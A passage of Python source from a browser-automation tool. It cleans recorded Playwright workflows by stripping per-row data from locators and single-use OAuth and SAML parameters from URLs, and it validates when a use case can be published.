                    f"{offending} -- it is a CSS selector, and a row whose value "
                    f"contained selector syntax would address a different element "
                    f"({locator.describe()}). Match on a name, a label or a text "
                    "filter instead, which are compared as plain strings."
                )
        return self

    def references(self) -> set[tuple[str, str]]:
        """Every ``(kind, name)`` this step's value-bearing fields reference."""
        return template_refs(
            {
                "url": self.url,
                "value": self.value,
                "fields": [f.value for f in self.fields],
                # Locators count too, now that a name may be templated. A step
                # that finds its element by "{{input.customer_name}}" and does
                # not declare that input would otherwise pass review and then
                # look for the literal text on every row.
                "locators": [loc.template_values() for loc in self.locators],
                "field_locators": [
                    loc.template_values() for f in self.fields for loc in f.locators
                ],
                "assert": self.assertion.value if self.assertion else None,
                "wait": self.wait_for.value if self.wait_for else None,
                # Script code counts. It used to be excluded because nothing
                # substituted into it, so an input referenced there could never
                # be filled -- which meant a recording that drove a form via
                # JavaScript produced a use case with no inputs at all, asking
                # for nothing and typing "{{input.full_name}}" into the page.
                # render_code() makes the reference real, so it is now counted.
                "code": self.code,
            }
        )

    def summary(self) -> str:
        if self.description:
            return self.description
        if self.action == "navigate":
            return f"navigate to {self.url}"
        if self.action == "assert" and self.assertion:
            return f"assert {self.assertion.describe()}"
        if self.locators:
            return f"{self.action} {self.locators[0].describe()}"
        return self.action


# ---------------------------------------------------------------------------
# A locator made of the row's own data
# ---------------------------------------------------------------------------
#
# The defect this exists for, in the shape it was found in: a search box whose
# dropdown is filled from what you type. You type a customer *number*, the
# dropdown offers customer *names*, and you click one. `playwright codegen`
# writes `get_by_role("option", name="Acme Ltd")`, because that is what was on
# the screen -- and it is completely right about the run it watched.
#
# It is wrong about every other run. "Acme Ltd" is not part of the page's
# design, it is row one's answer, and a recording that carries it is good for
# exactly one customer. The failure is quiet in the worst way: row one passes,
# so the recording looks correct, and rows two onward fail on a step that reads
# perfectly well.
#
# Nothing downstream can catch this. The locator is well-formed, it is
# semantic, it is the kind of rung this whole schema argues for -- it is just
# made of the wrong thing. It has to be caught where the recording is turned
# into a use case, which is the last point at which "this value came from the
# person's spreadsheet" is still known.

#: Roles an element takes when it is a *result* rather than a control. A page
#: does not author these; a search fills them in. ``option`` is the ARIA
#: combobox/listbox pattern and the rest are its menu and tree equivalents.
SUGGESTION_ROLES: frozenset[str] = frozenset(
    {"option", "menuitem", "menuitemradio", "menuitemcheckbox", "treeitem"}
)

#: Steps that may sit between typing a search and clicking its result without
#: breaking the connection between the two. Waiting for the dropdown, pressing
#: Enter to open it, hovering an entry -- none of those change whose data the
#: suggestion is showing.
_BETWEEN_SEARCH_AND_RESULT: frozenset[str] = frozenset({"wait", "press", "hover"})


def _names_a_row_value(step: "Step") -> bool:
    """Whether this step typed something that differs from row to row."""
    if step.action not in {"fill", "fill_form", "select", "press"}:
        return False
    return any(kind == "input" for kind, _ in step.references())


def _after_a_per_row_search(steps: list["Step"], index: int) -> bool:
    """Whether the nearest preceding typing action typed per-row data.

    The nearest one decides, whichever way it decides: anything before it was
    typed into a different control on a different part of the workflow, and
    says nothing about this dropdown.
    """
    for earlier in reversed(steps[:index]):
        if earlier.action in _BETWEEN_SEARCH_AND_RESULT:
            continue
        return _names_a_row_value(earlier)
    return False


#: Shorter than this, a recorded value is not evidence of anything. "A" or
#: "12" appears inside half the labels on a page, and matching on one would
#: strip the name off a perfectly good locator.
_MIN_TELLTALE = 3


def _echoes_a_recorded_value(locator: "Locator", recorded: list[str]) -> str:
    """The recorded row value this locator's own text repeats, or "".

    The second detector, and the certain one. When a dropdown echoes what was
    typed -- search "C-1001", the suggestion reads "C-1001 Acme Ltd" -- the
    locator contains, verbatim, a value the person told us is a per-row input.
    That is not an inference about the page; it is the same string twice.

    Works on any strategy, which is what makes it worth having beside the
    role-based rule: a dropdown built from plain divs carries no ARIA role to
    recognise, so nothing else can see it.
    """
    haystack = " ".join(locator.template_values()).casefold()
    if not haystack.strip():
        return ""
    for value in recorded:
        text = (value or "").strip()
        if len(text) >= _MIN_TELLTALE and text.casefold() in haystack:
            return text
    return ""


def data_derived_clicks(
    steps: list["Step"], recorded_values: Iterable[str] = ()
) -> list[int]:
    """Indexes of steps whose locator was made out of the row's own data.

    Two rules, and a step qualifies on either.

    **A suggestion, after a per-row search.** The leading rung is a ``role``
    rung whose role is one a page fills in rather than authors -- see
    :data:`SUGGESTION_ROLES` -- it was recorded with a name, and the nearest
    preceding typing action typed a template. That last condition is what saves
    a static menu: a workflow that picks "Export as CSV" every row has a stable
    name and nothing to fix, and rewriting it would throw away a good locator
    and leave the step ambiguous among its siblings.

    **A locator that repeats a recorded value.** The name or text contains,
    verbatim, a value the person declared as a per-row input. Certain rather
    than inferred, and it works on a dropdown built from plain divs, which
    carries no role for the first rule to recognise.

    **What neither catches**, stated so nobody mistakes this for complete: a
    roleless dropdown whose text has no textual relationship to what was typed.
    Nothing in the recording distinguishes that click from any other, and
    guessing would strip the name off correct locators. That case is what the
    warning, the review screen and a templated name are for.
    """
    values = [v for v in recorded_values if v]
    found: list[int] = []
    for index, step in enumerate(steps):
        if step.action not in {"click", "select"} or not step.locators:
            continue
        lead = step.locators[0]

        suggestion = (
            lead.strategy == "role"
            and lead.role in SUGGESTION_ROLES
            and bool(lead.name)
            and _after_a_per_row_search(steps, index)
        )
        if suggestion or (values and _echoes_a_recorded_value(lead, values)):
            found.append(index)
    return found


def without_the_rows_data(locators: list["Locator"]) -> list["Locator"] | None:
    """``locators`` with the recorded name dropped, or ``None`` if it cannot be.

    The name is *removed*, never demoted to a fallback. A ladder is walked top
    to bottom and the first rung matching exactly one element wins, so keeping
    "Acme Ltd" as a later rung would do nothing on the rows where the search
    narrows to one -- and on the rows where it does not, it would step past the
    ambiguity refusal and click row one's customer. A demoted data locator is
    worse than a deleted one, because it acts only when it is certainly wrong.

    What is left is the role: "the suggestion in the list". That resolves
    whenever the search narrows to a single hit, which is what searching by a
    unique identifier does, and refuses loudly when it does not -- because at
    that point the recording genuinely does not say which one a different row
    should take.

    ``None`` when every rung named the element by its text, which is what a
    roleless dropdown gives you. There is nothing left once the text goes, and
    inventing a locator for an element nobody here has seen is the one thing
    this codebase never does.
    """
    usable = [loc for loc in locators if loc.strategy == "role" and loc.role]
    if not usable:
        return None
    lead = usable[0]
    return [lead.model_copy(update={"name": None, "exact": False, "has_text": None})]


def strip_data_locators(
    steps: list["Step"], recorded_values: Iterable[str] = ()
) -> list[str]:
    """Strip row-one's data out of any locator that was made from it.

    Mutates ``steps`` and returns a warning per step changed. The recorded rung
    is kept on the step as a ``rejected_locators`` entry -- visible on the
    review screen, never executed -- because a reviewer deciding whether this
    was the right call needs to see what the recording actually said.

    Rewriting rather than only warning, because a warning alone leaves the
    default behaviour wrong: the use case would publish, row one would pass,
    and the batch would fail from row two onward on a step that reads perfectly
    well. The rewrite is not a guess about the page either -- it drops
    something the recording should never have carried and keeps what is left.
    """
    notes: list[str] = []
    for index in data_derived_clicks(steps, recorded_values):
        step = steps[index]
        recorded = step.locators[0].describe()
        replacement = without_the_rows_data(step.locators)
        if replacement is None:
            notes.append(
                f"Step {step.id} clicks something the recording could only find by the text "
                f"it showed on the row you recorded ({recorded}), and that text came from "
                f"your data rather than from the page. It will look for that one record on "
                f"every row. Edit the step's locator before publishing -- a column from your "
                f"file can be used there as {{{{input.your_column}}}}."
            )
            continue
        step.rejected_locators = [*step.rejected_locators, *step.locators]
        step.locators = replacement
        notes.append(
            f"Step {step.id} clicks a suggestion from a search you filled with a value from "
            f"your data, and the recording addressed it by the text it showed on the row you "
            f"recorded ({recorded}). That text is row one's answer, not part of the page, so "
            f"replaying it would look for that one record every time. The step now finds the "
            f"suggestion by what it is ({replacement[0].describe()}), which works whenever the "
            f"search narrows to a single hit. If yours can return several, edit the step's "
            f"locator to say which -- a column from your file can be used there as "
            f"{{{{input.your_column}}}}."
        )
    return notes


# ---------------------------------------------------------------------------
# A URL made of one sign-in's data
# ---------------------------------------------------------------------------
#
# The same defect as the section above, in the address bar. Record a workflow
# behind single sign-on and the recording captures URLs like
#
#   https://login.example.com/oauth2/authorize?client_id=...&state=Ab9xQ2zKp&nonce=Nn41Kd
#   https://app.example.com/cb?code=0.AXkAr9&state=Ab9xQ2zKp&session_state=4f1c
#
# Every interesting part of those is single-use. `state` and `nonce` exist
# precisely so that the identity provider can reject a second use of them;
# `code` is exchanged once and burned. A recording that carries them replays a
# sign-in that has already happened, which does not merely fail -- it fails at
# the identity provider, with a message about a bad request, on a step that
# looks like it is just visiting a page.
#
# None of this is inference. These parameter names are defined by OAuth 2.0,
# OpenID Connect and SAML to be per-request; recognising them is reading a
# specification, not guessing about a site.

#: Query parameters that belong to one sign-in and never to the next.
#:
#: Deliberately a closed list of protocol artefacts. Anything a *site* invented
#: stays, because this cannot know what it means -- and a parameter that varies
#: per row is already handled, by being templated into `{{input.x}}` when the
#: person says which column it came from.
VOLATILE_QUERY_PARAMS: frozenset[str] = frozenset(
    {
        # OAuth 2.0 / OpenID Connect
        "state", "nonce", "code", "code_challenge", "code_challenge_method",
        "code_verifier", "session_state", "id_token", "id_token_hint",
        "access_token", "refresh_token", "auth_token", "authuser",
        # SAML 2.0
        "samlrequest", "samlresponse", "relaystate", "sigalg", "signature",
        # CAS, and the session keys several identity products put in the query
        "ticket", "sessiondatakey", "execution", "client-request-id",
        "jsessionid", "phpsessid", "sessionid", "session_id",
    }
)

#: Parameters whose presence *identifies* a URL as an authorization request.
#: Required by the specifications, so their absence means it is not one.
_AUTHORIZE_MARKERS: frozenset[str] = frozenset({"response_type", "samlrequest"})

#: Parameters whose presence identifies a URL as the *answer* to one.
_CALLBACK_MARKERS: frozenset[str] = frozenset({"code", "samlresponse", "ticket"})


def _query_names(url: str) -> set[str]:
    parsed = urlparse(url)
    return {name.lower() for name, _ in parse_qsl(parsed.query, keep_blank_values=True)}


def is_authorization_request(url: str) -> bool:
    """Whether this URL is a sign-in being *asked for*.

    An OAuth authorization request carries ``response_type`` and ``client_id``;
    a SAML one carries ``SAMLRequest``. Both are required by their
    specification, which is what makes this a reading rather than a guess.
    """
    names = _query_names(url)
    if "samlrequest" in names:
        return True
    return "response_type" in names and "client_id" in names


def is_authorization_callback(url: str) -> bool:
    """Whether this URL is a sign-in being *answered*.

    Two co-occurring protocol parameters rather than one, because ``code`` on
    its own is an ordinary word that a real application may well use for a
    product code or a country code. ``code`` *with* ``state`` is an OAuth
    redirect and nothing else.
    """
    names = _query_names(url)
    if names & {"samlresponse"}:
        return True
    if "ticket" in names and "service" in names:  # CAS
        return True
    return "code" in names and "state" in names


def strip_volatile_params(url: str) -> tuple[str, list[str]]:
    """``url`` without its single-use parameters, and the names removed.

    Works on the raw query text and keeps every surviving pair exactly as it
    was recorded. Parsing the query and rebuilding it would have been shorter
    and was wrong twice over: it re-encodes a ``redirect_uri`` that arrived
    percent-encoded, and it escapes the braces of a parameter already
    templated into ``{{input.x}}`` -- turning a working substitution into a
    literal ``%7B%7Binput.x%7D%7D`` that matches nothing.

    This is only allowed to *shorten* a URL. Everything it keeps, it keeps
    byte for byte.
    """
    parsed = urlparse(url)
    if not parsed.query:
        return url, []

    kept: list[str] = []
    removed: list[str] = []
    for pair in parsed.query.split("&"):
        if not pair:
            continue
        name = pair.split("=", 1)[0]
        if name.lower() in VOLATILE_QUERY_PARAMS:
            removed.append(name)
        else:
            kept.append(pair)
    if not removed:
        return url, []
    return urlunparse(parsed._replace(query="&".join(kept))), removed


def application_origin(urls: list[str]) -> str:
    """Which of the recorded hosts is the *application*.

    The first URL used to answer this, and behind single sign-on the first URL
    is the identity provider -- so a use case recorded behind SSO bound
    ``{{env.base_url}}`` to ``login.microsoftonline.com``. Promoting it to UAT
    then repointed the identity provider at the UAT address, which is not a
    thing anybody meant and is very hard to see in a diff.

    Two rules, in order:

    1. The first recorded URL that is not a sign-in request or its callback.
       In an SSO recording that is the application; in every other recording it
       is the first URL, which is what this always did.
    2. Failing that, the ``redirect_uri`` of the authorization request itself.
       An authorization request states where the application lives -- that is
       what the parameter is for -- so this is reading the recording rather
       than guessing at it.
    """
    for url in urls:
        if not is_authorization_request(url) and not is_authorization_callback(url):
            return _origin(url)

    for url in urls:
        if not is_authorization_request(url):
            continue
        for name, value in parse_qsl(urlparse(url).query, keep_blank_values=True):
            if name.lower() == "redirect_uri" and value:
                origin = _origin(value)
                if origin:
                    return origin
    return _origin(urls[0]) if urls else ""


def _origin(url: str) -> str:
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        return ""
    return f"{parsed.scheme}://{parsed.netloc}"


def clean_recorded_urls(steps: list["Step"]) -> list[str]:
    """Take one sign-in's data out of the URLs a recording captured.

    Mutates ``steps`` and returns a warning per change. Two different edits,
    because the two shapes fail differently.

    **A navigation that is only a callback is dropped.** ``…/cb?code=…&state=…``
    is not a step anybody took -- it is the browser being sent somewhere by the
    identity provider -- and there is nothing left of it once the single-use
    parameters go: a bare callback endpoint with no code is an error page.
    Replaying it is replaying a consumed authorization code. The sign-in steps
    above it put the browser here again on their own.

    **Everything else keeps its URL, minus the volatile parameters.** Including
    an authorization request: it still has to be visited, and with a fresh
    ``state`` minted by the identity provider rather than last week's.
    """
    notes: list[str] = []
    dropped: list[Step] = []

    for step in steps:
        if step.action != "navigate" or not step.url:
            continue

        if is_authorization_callback(step.url):
            dropped.append(step)
            notes.append(
                f"Step {step.id} was the page your identity provider redirected the "
                f"browser to after signing in, and its address was almost entirely a "
                f"one-time code. Nobody types that address, and replaying it would "
                f"replay a code that has already been used, so the step has been "
                f"removed -- signing in again puts the browser there by itself."
            )
            continue

        cleaned, removed = strip_volatile_params(step.url)
        if not removed:
            continue
        step.url = cleaned
        notes.append(
            f"Step {step.id} recorded a web address carrying {_and_list(removed)}, "
            f"{'which belongs' if len(set(removed)) == 1 else 'which belong'} to the "
            f"sign-in you did while recording and "
            f"{'is' if len(set(removed)) == 1 else 'are'} refused the second time "
            f"{'it is' if len(set(removed)) == 1 else 'they are'} used. Taken out of the "
            f"address; the rest of it is unchanged."
        )

    for step in dropped:
        steps.remove(step)

    for step in steps:
        check = step.assertion
        if check is None or check.kind != "url_contains" or not check.value:
            continue
        cleaned, removed = strip_volatile_params(check.value)
        if removed:
            step.assertion = check.model_copy(update={"value": cleaned})
            notes.append(
                f"Step {step.id} checked the address for {_and_list(removed)}, which is "
                f"different on every sign-in. The check now ignores those."
            )
    return notes


def _and_list(names: list[str]) -> str:
    quoted = [f"'{name}'" for name in dict.fromkeys(names)]
    if len(quoted) == 1:
        return quoted[0]
    return ", ".join(quoted[:-1]) + f" and {quoted[-1]}"


# ---------------------------------------------------------------------------
# Steps that were never the workflow
# ---------------------------------------------------------------------------
#
# `playwright codegen` records keystrokes, and a person filling a form uses Tab
# to get between the fields. What lands in the script is a `press` aimed at
# whatever happened to have focus at that moment -- in one real recording,
# `press Shift+Tab` on the "Forgot password?" link, twice, in the middle of a
# login. Nobody meant those as steps. They are how a person's hands move.
#
# They are also actively harmful: each one is a locator that has to resolve
# before the workflow can continue, pointing at a control chosen by the tab
# order rather than by the task. Dropping them is safe because `fill` focuses
# the element it fills, so a Tab before a fill was already redundant, and
# focusing the next field blurs the last one exactly as tabbing away would.

#: Keys that move focus and change nothing else. Deliberately just these two:
#: Enter submits, Escape dismisses, the arrows choose from a list -- every
#: other key a recording captures may be the point of the step.
FOCUS_KEYS: frozenset[str] = frozenset({"tab", "shift+tab"})


def drop_focus_keystrokes(steps: list["Step"]) -> list[str]:
    """Remove the Tab presses a recording captured. Mutates ``steps``."""
    doomed = [
        step
        for step in steps
        if step.action == "press" and (step.value or "").strip().casefold() in FOCUS_KEYS
    ]
    for step in doomed:
        steps.remove(step)
    if not doomed:
        return []
    keys = ", ".join(sorted({(step.value or "").strip() for step in doomed}))
    return [
        f"{len(doomed)} keystroke(s) that only moved the cursor between fields ({keys}) "
        f"were left out. They are how your hands moved while recording, not part of the "
        f"task, and replaying them means finding whichever control the tab order happened "
        f"to reach."
    ]


# ---------------------------------------------------------------------------
# Shapes that cannot replay
# ---------------------------------------------------------------------------
#
# Checked when a use case is *published*, which is the point the product says
# "this may now run over a thousand rows". Both of these are certain: neither
# is a judgement about a site, and neither can be rescued by healing a locator.
#
# They exist because both failures are silent in the worst way. The first
# produces a step that can never match anything, and the draft already said so
# in a warning that publishing was happy to ignore. The second produces a batch
# where row one passes and every row after it fails, which reads as flakiness
# and is actually arithmetic.

#: Phrases that end a session, however a site words it.
_SIGN_OUT = ("sign out", "signout", "log out", "logout", "sign off", "signoff")

#: Phrases that start one.
_SIGN_IN = ("sign in", "signin", "log in", "login", "log on", "continue")


def _leading_name(step: "Step") -> str:
    if not step.locators:
        return ""
    lead = step.locators[0]
    return (lead.name or lead.text or "").strip().casefold()


def _is_unnameable(locator: "Locator") -> bool:
    """A structural wrapper with no accessible name.

    ``Snapshot.locate`` refuses these outright, and says why: ``generic`` with
    no name describes half the wrappers on any real page, so "the 25th one" is
    a near-arbitrary element. A step whose *every* rung is one of these cannot
    resolve, ever.
    """
    return (
        locator.strategy == "role"
        and (locator.role or "") in STRUCTURAL_ROLES_WITHOUT_MEANING
        and not (locator.name or "").strip()
    )


#: Kept here rather than imported from `snapshot` so the schema does not depend
#: on the parser. The two lists mean the same thing and are asserted equal by
#: `tests/test_usecase.py`.
STRUCTURAL_ROLES_WITHOUT_MEANING: frozenset[str] = frozenset(
    {"generic", "group", "none", "presentation"}
)


def ends_the_session(step: "Step") -> bool:
    name = _leading_name(step)
    return step.action == "click" and any(phrase in name for phrase in _SIGN_OUT)


def establishes_the_session(steps: list["Step"]) -> bool:
    """Whether these steps sign in.

    Either a credential is typed, or something that reads like a sign-in
    control is clicked. The first is the reliable half -- a `{{secret.x}}`
    going into a field is what signing in *is*, as far as this schema can see.
    """
    for step in steps:
        if any(kind == "secret" for kind, _ in step.references()):
            return True
        if step.action == "click" and any(
            phrase in _leading_name(step) for phrase in _SIGN_IN
        ):
            return True
    return False


def unreplayable_reasons(use_case: "UseCase") -> list[str]:
    """Why no run of this use case can work, or an empty list.

    This blocks publishing, so the bar is absolute: a step here cannot succeed
    on *any* row, so letting it through guarantees a failed run and there is
    nothing a person could know that would make it fine.

    Anything that breaks only *across* rows belongs in
    :func:`unbatchable_reasons` instead, and anything that is merely unwise
    belongs in ``warnings``. Getting that boundary wrong turned a recording
    somebody had just spent ten minutes on into a dead end they could only
    delete, which is a worse outcome than the failing run it was preventing.
    """
    reasons: list[str] = []
    for step in use_case.all_steps:
        if step.locators and all(_is_unnameable(loc) for loc in step.locators):
            reasons.append(
                f"Step {step.id} ({step.summary()}) can only find its element by "
                f"counting anonymous page wrappers -- there is no name and no role that "
                f"means anything, so it cannot work on any record. Two ways out, both on "
                f"this screen: press Edit beside the step's locator and point it at "
                f"something with a real name, or remove the step if the workflow does "
                f"not need it."
            )
    return reasons


def unbatchable_reasons(use_case: "UseCase") -> list[str]:
    """Why this use case cannot run over *many* records, or an empty list.

    Separate from :func:`unreplayable_reasons` because the failure is
    arithmetic about rows rather than a broken step: a single record runs
    perfectly, and the second one cannot. So this is checked when a batch
    starts -- where it is certain and where it is actionable -- and not when
    the use case is published, where it would refuse something the person may
    only ever intend to run once.
    """
    reasons: list[str] = []
    signs_out = [step for step in use_case.row_steps if ends_the_session(step)]
    if (
        signs_out
        and establishes_the_session(use_case.setup_steps)
        and not establishes_the_session(use_case.row_steps)
        and use_case.session_check is None
    ):
        first = signs_out[0]
        reasons.append(
            f"Step {first.id} signs out at the end of every record, and signing *in* "
            f"happens once for the whole run rather than once per record -- that is what "
            f"keeps a thousand records from signing in a thousand times. So record one "
            f"would work and every record after it would fail with nothing signed in. "
            f"Three ways to fix it: remove the sign-out step, move the sign-in steps "
            f"into the per-record section so each record signs in for itself, or add a "
            f"session check so the run notices it has been signed out and signs in "
            f"again. A single record runs fine as it stands."
        )
    return reasons


# ---------------------------------------------------------------------------
# The use case
# ---------------------------------------------------------------------------


class UseCase(BaseModel):
    """A recorded run, parameterised and made replayable."""

    model_config = ConfigDict(extra="forbid", populate_by_name=True)

    schema_version: int = SCHEMA_VERSION
    id: str = Field(default_factory=lambda: uuid.uuid4().hex)
    name: str = Field(min_length=1, max_length=200)
    description: str = ""
    status: Status = "draft"
    #: The origin this was recorded against -- scheme and host, no path. It is
    #: what ``{{env.base_url}}`` falls back to when the deployment names no
    #: value of its own, which is what lets one document run unchanged in dev,
    #: UAT and production: dev needs no configuration at all, and the other two
    #: each set ``USECASE_ENV`` once. Empty on anything recorded before this
    #: existed, whose URLs are still literal and still work.
    base_url: str = ""
    #: The name of the target supplying this use case's base URL. The document
    #: says *which* site; each deployment says where that site is, so promoting
    #: a use case carries no address with it. Empty means "the URL recorded
    #: into this definition", which is what a single-environment install needs.
    target: str = ""
    #: How this use case runs, or ``None`` for "whatever the deployment says".
    #:
    #: The three-way split is deliberate and the reason is upgrades. A document
    #: written before this field existed has not chosen anything, and defaulting
    #: it to ``strict`` would silently switch healing *off* in a deployment that
    #: has ``REPLAY_HEALING_ENABLED=true`` today -- a behaviour change nobody
    #: asked for, arriving with a schema addition. ``None`` therefore means
    #: "inherit", and the moment somebody picks a mode on the screen it becomes
    #: explicit and wins over the deployment either way.
    mode: Mode | None = None
    #: Who wrote this document. Recorded rather than inferred: a use case
    #: distilled from an agent session and one recorded by hand are the same
    #: shape on purpose, so the provenance has to be carried, not guessed.
    authored_by: AuthoredBy = "person"
    version: int = 1
    source_run_id: str | None = None

    allowed_domains: list[str] = Field(default_factory=list)
    #: `script` steps refuse to run unless a human turns this on. See §9.3.
    allow_scripts: bool = False

    inputs: list[InputSpec] = Field(default_factory=list)
    secrets: list[SecretSpec] = Field(default_factory=list)

    #: Once per session. The login lives here.
    setup_steps: list[Step] = Field(default_factory=list)
    #: Cheap proof the shared session is still authenticated, checked between rows.
    session_check: Assertion | None = None
    #: Returns the browser to a known state before each row.
    row_reset: Step | None = None
    #: Once per input row.
    row_steps: list[Step] = Field(default_factory=list)
    teardown_steps: list[Step] = Field(default_factory=list)

    outputs: list[str] = Field(default_factory=list)

    #: The whole flow in plain language, written after recording.
    #:
    #: A step list says what happens and in which order. It does not say what
    #: the workflow is *for*, which is what a reviewer deciding whether to
    #: publish needs, and what a repair months later needs before it can judge
    #: whether a replacement control makes sense. Written by one model call
    #: over the distilled steps (`agent/brief.py`), in the language the task
    #: was written in.
    #:
    #: Prose, deliberately. Anything a replay acts on is a `Step`; this is read
    #: by people and by the two prompts that ask a model where a control went.
    instructions: str = Field(default="", max_length=10_000)

    #: Seconds to wait between rows, overriding the deployment default.
    #:
    #: Politeness is a property of the site, not of the installation. One
    #: vendor tolerates a request a second and another starts refusing after
    #: three; a single number in the environment cannot be right for both, and
    #: the person who recorded the workflow is the one who knows which site
    #: this is. None means "use REPLAY_ROW_DELAY_SECONDS".
    row_delay_seconds: float | None = Field(default=None, ge=0, le=600)
    warnings: list[str] = Field(default_factory=list)
    #: Recorded calls that did NOT become steps, and why. A recording keeps
    #: only what succeeded, so this is how a reviewer checks that nothing they
    #: needed was lost -- to a failure, or to a mis-detected one.
    dropped: list[str] = Field(default_factory=list)

    created_at: str = Field(default_factory=_now)
    updated_at: str = Field(default_factory=_now)

    # -- derived ------------------------------------------------------------
    @property
    def all_steps(self) -> list[Step]:
        reset = [self.row_reset] if self.row_reset else []
        return [*self.setup_steps, *reset, *self.row_steps, *self.teardown_steps]

    @property
    def input_names(self) -> set[str]:
        return {spec.name for spec in self.inputs}

    @property
    def secret_names(self) -> set[str]:
        return {spec.name for spec in self.secrets}

    @property
    def runnable(self) -> bool:
        return self.status == "ready" and bool(self.row_steps or self.setup_steps)

    # -- validation ---------------------------------------------------------
    @field_validator("allowed_domains")
    @classmethod
    def _clean_domains(cls, value: list[str]) -> list[str]:
        return [d.strip() for d in value if d and d.strip()]

    @model_validator(mode="after")
    def _step_ids_are_unique(self) -> "UseCase":
        seen: set[str] = set()
        for step in self.all_steps:
            if step.id in seen:
                raise ValueError(f"duplicate step id {step.id!r}")
            seen.add(step.id)
        return self

    @model_validator(mode="after")
    def _published_steps_must_be_replayable(self) -> "UseCase":
        """A *published* use case may not contain a step that cannot run.

        Publishing is the point the product says "this may now run over a
        thousand rows", so it is the right place to refuse a shape that will
        produce a thousand failures. The draft carried these as warnings, and a
        warning that publishing ignores is not a gate -- which is how a use case
        whose own draft said "a replay cannot trust this" came to be published
        and then failed exactly as predicted.

        See :func:`unreplayable_reasons`; only certainties are listed there.
        """
        if self.status != "ready":
            return self
        reasons = unreplayable_reasons(self)
        if reasons:
            raise ValueError(
                "This cannot be published yet, because a step in it cannot work on "
                "any record:" + NEWLINE + NEWLINE
                + (NEWLINE + NEWLINE).join(f"- {reason}" for reason in reasons)
            )
        return self

    @model_validator(mode="after")
    def _published_scripts_require_opt_in(self) -> "UseCase":
        """A *published* use case may not contain scripts without the opt-in.

        Checked at ``ready``, not at ``draft``, because a recording that used
        ``browser_run_code_unsafe`` must still be distillable -- otherwise the
        review UI could never show a person the code they are being asked to
        approve. The executor enforces the same rule again at run time, so a
        script step can never execute without a deliberate decision.
        """
        if self.allow_scripts or self.status != "ready":
            return self
        offenders = [s.id for s in self.all_steps if s.action == "script"]
        if offenders:
            raise ValueError(
                "cannot publish: this use case contains script steps ("
                + ", ".join(offenders)
                + ") but allow_scripts is false. A script step is arbitrary JavaScript against a "
                "live authenticated session; read the code, then enable it deliberately."
            )
        return self

    @property
    def script_steps(self) -> list[Step]:
        """Steps carrying raw JavaScript. Shown in full in the review UI."""
        return [s for s in self.all_steps if s.action == "script"]

    @property
    def blocked_scripts(self) -> list[str]:
        """Script step ids that will refuse to execute under the current setting."""
        return [] if self.allow_scripts else [s.id for s in self.script_steps]

    @model_validator(mode="after")
    def _setup_never_reads_a_row_input(self) -> "UseCase":
        """Setup runs once per batch, so a per-row input there is a modelling error.

        Left unchecked it would silently apply row 1's value to all 1,000 rows,
        which looks like success and is not.
        """
        offenders = [
            (step.id, name)
            for step in self.setup_steps
            for kind, name in step.references()
            if kind == "input"
        ]
        if offenders:
            detail = ", ".join(f"{sid} uses {{{{input.{n}}}}}" for sid, n in offenders)
            raise ValueError(
                "setup_steps run once per batch and cannot reference a per-row input "
                f"({detail}). Move the step to row_steps, or make the value a secret."
            )
        return self

    @model_validator(mode="after")
    def _templates_resolve_to_declared_names(self) -> "UseCase":
        known_inputs, known_secrets = self.input_names, self.secret_names
        missing: list[str] = []
        for step in self.all_steps:
            for kind, name in step.references():
                if kind == "input" and name not in known_inputs:
                    missing.append(f"{step.id}: {{{{input.{name}}}}}")
                elif kind == "secret" and name not in known_secrets:
                    missing.append(f"{step.id}: {{{{secret.{name}}}}}")
        if missing:
            raise ValueError(
                "these templates reference names that are not declared: " + "; ".join(missing)
            )
        return self

    def impossible_assertions(self) -> list[tuple[str, str]]:
        """``(where, why)`` for every assertion that can never hold.

        Covers the session check too: one that can never pass makes the batch
        runner think the session dropped after every single row, and re-run
        sign-in forever.
        """
        found: list[tuple[str, str]] = []
        for step in self.all_steps:
            for what, check in (("", step.assertion), (" condition", step.when)):
                if check is None:
                    continue
                reason = check.unsatisfiable_reason(self.allowed_domains)
                if reason:
                    # A `when` that can never hold does not fail a row, it
                    # skips the step on every row -- so the symptom is a
                    # workflow that quietly does less than it was recorded
                    # doing, which is harder to notice than a failure.
                    found.append((step.id + what, reason))
        if self.session_check is not None:
            reason = self.session_check.unsatisfiable_reason(self.allowed_domains)
            if reason:
                found.append(("session_check", reason))
        return found

    @model_validator(mode="after")
    def _published_assertions_can_pass(self) -> "UseCase":
        """A published use case may not carry an assertion that can never hold.

        Checked at ``ready`` so a draft can still be inspected and repaired.
        """
        if self.status != "ready":
            return self
        broken = self.impossible_assertions()
        if broken:
            detail = "; ".join(f"{where} {why}" for where, why in broken)
            raise ValueError(f"cannot publish: {detail}")
        return self

    @model_validator(mode="after")
    def _published_inputs_are_all_used(self) -> "UseCase":
        """A published use case may not demand an input nothing reads.

        An unused input is worse than useless: whoever runs it has to supply a
        value for every row, and nothing does anything with it. It happens when
        a literal gets parameterised inside `script` code, which nothing can
        substitute into. Checked at ``ready`` so a draft can still be inspected.
        """
        if self.status != "ready":
            return self
        if self.mode == "explore":
            # Same exception, same reason: there are no steps to read an input,
            # and the row's values are handed to the agent as the record it is
            # working on rather than substituted into anything.
            return self
        referenced = {
            name for step in self.all_steps for kind, name in step.references() if kind == "input"
        }
        unused = [spec.name for spec in self.inputs if spec.name not in referenced]
        if unused:
            raise ValueError(
                "cannot publish: these inputs are declared but no step reads them ("
                + ", ".join(unused)
                + "). Either wire them into a step or remove them -- asking for a value on "
                "every row and then ignoring it is never right."
            )
        return self

    @model_validator(mode="after")
    def _declared_outputs_match_extract_steps(self) -> "UseCase":
        """Every declared output has to come from somewhere.

        For a recorded use case that somewhere is a step, and a declared output
        no step produces is a column that would be blank on every row.

        ``explore`` is the exception, and it is a real one rather than a hole:
        that mode has no steps at all -- the agent works each row out and
        reports values as it sees them -- so the declared outputs are the
        *instruction*, not a summary of the steps. They are what the agent is
        told to look for, and a row that finishes without them is failed by the
        operate graph rather than returned with blanks.
        """
        if self.mode == "explore":
            return self
        produced = {
            s.output
            for s in self.all_steps
            if s.action in {"extract", "extract_rows", "download"} and s.output
        }
        declared = set(self.outputs)
        if declared - produced:
            raise ValueError(
                "outputs declared but never extracted: " + ", ".join(sorted(declared - produced))
            )
        return self

    # -- helpers ------------------------------------------------------------
    def missing_inputs(self, values: dict[str, Any]) -> list[str]:
        """Required input names absent from ``values``. Checked before the browser opens."""
        return [
            spec.name
            for spec in self.inputs
            if spec.required and spec.default is None and values.get(spec.name) in (None, "")
        ]

    def missing_secrets(self, values: dict[str, Any]) -> list[str]:
        return [
            spec.name
            for spec in self.secrets
